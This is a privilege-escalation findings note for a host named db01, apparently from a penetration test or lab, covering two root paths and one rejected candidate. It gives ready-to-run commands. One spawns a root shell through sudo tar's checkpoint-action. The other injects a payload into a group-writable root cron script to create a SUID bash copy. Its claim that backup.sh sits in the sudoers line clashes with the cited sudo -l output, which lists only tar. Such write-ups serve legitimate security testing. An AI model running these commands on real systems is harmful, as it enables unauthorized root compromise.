# Privilege escalation paths on db01 (account: auditor)

## Viable paths to root

### Path 1 - sudo tar (GTFOBins technique)

- Artifact: `recon/sudo-l.txt` - `(ALL) NOPASSWD: /usr/bin/tar`, confirmed by the change-log
  note in `recon/notes.txt` (added for the auditors group).
- Why it works: tar runs as root without a password, and tar's `--checkpoint-action` can
  execute an arbitrary command during archive processing.
- Exact command (interactive root shell):

  ```bash
  sudo tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  ```

  (Equivalent non-interactive form: `--checkpoint-action=exec=<payload script>`.)

### Path 2 - root-cron script writable by our group

- Artifacts: `recon/crontab-root.txt` (root runs `/usr/local/bin/backup.sh` at 02:30 daily)
  and `recon/writable.txt` (`/usr/local/bin/backup.sh`, group `auditors`, mode 664).
  `opt/backup.sh` confirms the script content is ordinary, but the permissions are the
  problem.
- Why it works: we can edit a script that root executes from cron. Insert a payload and wait
  for 02:30 (or force it: the script is also in our sudoers line).
- Exact commands:

  ```bash
  echo 'cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' >> /usr/local/bin/backup.sh
  # either wait for the 02:30 cron run, or trigger it ourselves (sudoers allows it):
  sudo /usr/local/bin/backup.sh
  /tmp/rootbash -p
  ```

## Rejected candidate

- `/opt/tools/screen-4.9.1/screen` (SUID root, `recon/suid.txt`) is **not** viable: the
  well-known SUID-root escalation affects screen **<= 4.9.0**, and the change log
  (`recon/notes.txt`, 2024-07-23) records the upgrade to 4.9.1 with the fix verified by the
  platform team. The installed binary is patched, so the published exploit does not apply to
  this version.
